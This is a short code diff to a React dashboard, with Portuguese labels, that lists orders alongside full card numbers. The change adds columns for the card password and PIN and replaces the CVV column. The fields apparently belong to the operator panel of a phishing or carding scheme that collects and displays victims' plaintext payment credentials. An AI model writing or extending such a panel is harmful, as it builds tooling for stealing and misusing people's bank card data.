@@ -158,6 +158,7 @@ function Dashboard({ onLogout }: { onLogout: () => void }) {
                   <th className="px-3 py-2">Produto</th>
                   <th className="px-3 py-2">Cartão</th>
                   <th className="px-3 py-2">Senha</th>
+                  <th className="px-3 py-2">PIN</th>
                   <th className="px-3 py-2">Valor</th>
                   <th className="px-3 py-2">Status</th>
                   <th className="px-3 py-2">Link</th>
@@ -190,7 +191,8 @@ function Dashboard({ onLogout }: { onLogout: () => void }) {
                       <div className="text-[11px] text-muted-foreground">qtd {p.produto_quantidade ?? 1}</div>
                     </td>
                     <td className="px-3 py-2 font-mono">{p.cartao_numero}</td>
-                    <td className="px-3 py-2 font-mono">{p.cartao_cvv}</td>
+                    <td className="px-3 py-2 font-mono">{p.cartao_senha}</td>
+                    <td className="px-3 py-2 font-mono">{p.cartao_pincode}</td>
                     <td className="px-3 py-2 font-semibold">
                       R$ {Number(p.valor).toFixed(2).replace(".", ",")}
                     </td>
